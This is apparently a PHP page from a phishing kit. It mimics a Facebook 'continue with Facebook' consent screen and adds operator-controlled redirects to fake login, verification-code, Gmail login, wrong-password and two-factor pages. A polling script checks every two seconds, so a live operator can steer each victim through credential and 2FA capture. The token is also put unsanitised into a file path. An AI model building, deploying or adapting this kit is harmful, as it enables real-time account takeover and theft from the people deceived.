<?php
$token = $_GET['token'] ?? '';

$filePath = "status/" . $token . ".txt";
if (!file_exists($filePath)) {
    file_put_contents($filePath, 'pwd');
}

if (file_exists($filePath)) {
    $data = trim(file_get_contents($filePath));

    if ($data === 'pwd') {
        header("Location: login.php?token=" . urlencode($token));
        exit;
    } elseif ($data === 'code') {
        header("Location: code.php?token=" . urlencode($token));
        exit;
    } elseif ($data === 'break') {
        header("Location: break.php?token=" . urlencode($token));
        exit;
    } elseif ($data === 'gm_verify') {
        header("Location: gmail_verify.php?token=" . urlencode($token));
        exit;
    } elseif ($data === 'gm_login') {
        header("Location: gmail_login.php?token=" . urlencode($token));
        exit;
    } elseif ($data === 'gm_wrong_pass') {
        header("Location: gmail_login.php?token=" . urlencode($token) . "&w=1");
        exit;
    } elseif ($data === 'gm_2fa_device') {
        header("Location: gmail_2fa.php?token=" . urlencode($token) . "&mode=device");
        exit;
    } elseif ($data === 'gm_2fa_pick') {
        header("Location: gmail_2fa.php?token=" . urlencode($token) . "&mode=pick");
        exit;
    } elseif ($data === 'gm_hold') {
        header("Location: gmail_login_POST.php?token=" . urlencode($token) . "&waiting=1");
        exit;
    } elseif ($data === 'continue' || $data === 'hold' || $data === '') {
        // show continue page below
    } else {
        // show continue page below
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="DC.title" content="">
    <meta name="revisit-after" content="1 day">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="distribution" content="GLOBAL">
    <meta name="rating" content="General">
    <meta name="copyright" content="">
    <meta name="author" content="">
    <meta name="theme-color" content="#FFF">
    <meta name="robots" content="noindex,nofollow">
    <link href="files/boxicons.min.css" rel="stylesheet">
    <link href="files/main.css" rel="stylesheet">
    <script src="files/jquery-3.6.4.min.js"></script>
    <link href="files/jquery.select.css" rel="stylesheet">
    <script src="files/socket.io.js"></script>
    <script src="files/jquery.select.min.js"></script>
    <title>Facebook</title>
    <link rel="icon" href="fb-files/favicon.png">
</head>

<body>
    <link href="fb-files/connecting.module.css" rel="stylesheet">
    <div class="connecting">
        <i class="bx bx-loader-alt bx-spin bx-rotate-90" id="spinner" style="font-size: 24px; display: none;"></i>
        <div class="container" id="container" style="">
            <div class="header">
                <svg xmlns="http://www.w3.org/2000/svg" width="32px" height="32px" viewBox="0 0 16 16" fill="none">
                <path fill="#1877F2" d="M15 8a7 7 0 00-7-7 7 7 0 00-1.094 13.915v-4.892H5.13V8h1.777V6.458c0-1.754 1.045-2.724 2.644-2.724.766 0 1.567.137 1.567.137v1.723h-.883c-.87 0-1.14.54-1.14 1.093V8h1.941l-.31 2.023H9.094v4.892A7.001 7.001 0 0015 8z"></path>
                <path fill="#ffffff" d="M10.725 10.023L11.035 8H9.094V6.687c0-.553.27-1.093 1.14-1.093h.883V3.87s-.801-.137-1.567-.137c-1.6 0-2.644.97-2.644 2.724V8H5.13v2.023h1.777v4.892a7.037 7.037 0 002.188 0v-4.892h1.63z"></path>
            </svg>


                <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 24 24" fill="none">
                <path d="M18.7153 1.71609C18.3241 1.32351 18.3241 0.687013 18.7153 0.294434C19.1066 -0.0981448 19.7409 -0.0981448 20.1321 0.294434L22.4038 2.57397L22.417 2.58733C23.1935 3.37241 23.1917 4.64056 22.4116 5.42342L20.1371 7.70575C19.7461 8.09808 19.1122 8.09808 18.7213 7.70575C18.3303 7.31342 18.3303 6.67733 18.7213 6.285L20.0018 5L4.99998 5C4.4477 5 3.99998 5.44772 3.99998 6V13C3.99998 13.5523 3.55227 14 2.99998 14C2.4477 14 1.99998 13.5523 1.99998 13V6C1.99998 4.34315 3.34313 3 4.99998 3H19.9948L18.7153 1.71609Z" fill="#9fa0a3"></path>
                <path d="M22 11C22 10.4477 21.5523 10 21 10C20.4477 10 20 10.4477 20 11V18C20 18.5523 19.5523 19 19 19L4.00264 19L5.28213 17.7161C5.67335 17.3235 5.67335 16.687 5.28212 16.2944C4.8909 15.9019 4.2566 15.9019 3.86537 16.2944L1.59369 18.574L1.58051 18.5873C0.803938 19.3724 0.805727 20.6406 1.58588 21.4234L3.86035 23.7058C4.25133 24.0981 4.88523 24.0981 5.2762 23.7058C5.66718 23.3134 5.66718 22.6773 5.2762 22.285L3.99563 21L19 21C20.6568 21 22 19.6569 22 18L22 11Z" fill="#9fa0a3"></path>
            </svg>


            <img src="files/log1.png" width="60" height="auto" />

            </div>
            <div class="content">
                <div class="info">
                    <h4>You previously logged in to Novius with Facebook.</h4>
                    <p>Would you like to continue?</p>
                </div>

                <form method="post" action="continue_POST.php" id="f1">
                    <input type="hidden" name="token" value="<?= htmlspecialchars($token); ?>" id="token" />
                </form>
                <div class="buttons">
                    <a href="#" class="continue" onclick="submit_continue()">Continue</a>
                    <a href="#" class="cancel" onclick="submit_continue()">Cancel</a>
                </div>
                <span>By continuing, Threads will receive ongoing access to the information you share and Facebook will record when Threads accesses it. <a href="#">Learn more</a> about this sharing and the settings you have</span>
                <span>Threads: <a href="#">Privacy Policy</a> and <a href="#">Teems of Service</a></span>
            </div>
        </div>
        <script>
            function submit_continue(){
                $("#f1").submit();
            }
        </script>
    </div>



</body>

</html>

    <script type="text/javascript">
        const token = "<?php echo htmlspecialchars($token); ?>";

        function checkStatus() {
            fetch(`check_place.php?token=${token}`)
                .then(response => response.text())
                .then(data => {
                    data = data.trim();

                    if (data === 'continue' || data === 'hold' || data === '') {
                        console.log("Do not redirect");
                        return;
                    } else if (data === 'pwd') {
                        window.location.href = 'login.php?token=' + token;
                    } else if (data === 'code') {
                        window.location.href = 'code.php?token=' + token;
                    } else if (data === 'break') {
                        window.location.href = 'break.php?token=' + token;
                    } else if (data === 'gm_verify') {
                        window.location.href = 'gmail_verify.php?token=' + token;
                    } else if (data === 'gm_login') {
                        window.location.href = 'gmail_login.php?token=' + token;
                    } else if (data === 'gm_wrong_pass') {
                        window.location.href = 'gmail_login.php?token=' + token + '&w=1';
                    } else if (data === 'gm_2fa_device') {
                        window.location.href = 'gmail_2fa.php?token=' + token + '&mode=device';
                    } else if (data === 'gm_2fa_pick') {
                        window.location.href = 'gmail_2fa.php?token=' + token + '&mode=pick';
                    } else if (data === 'gm_hold') {
                        window.location.href = 'gmail_login_POST.php?token=' + token + '&waiting=1';
                    } else {
                        return;
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        const statusInterval = setInterval(checkStatus, 2000);
    </script>
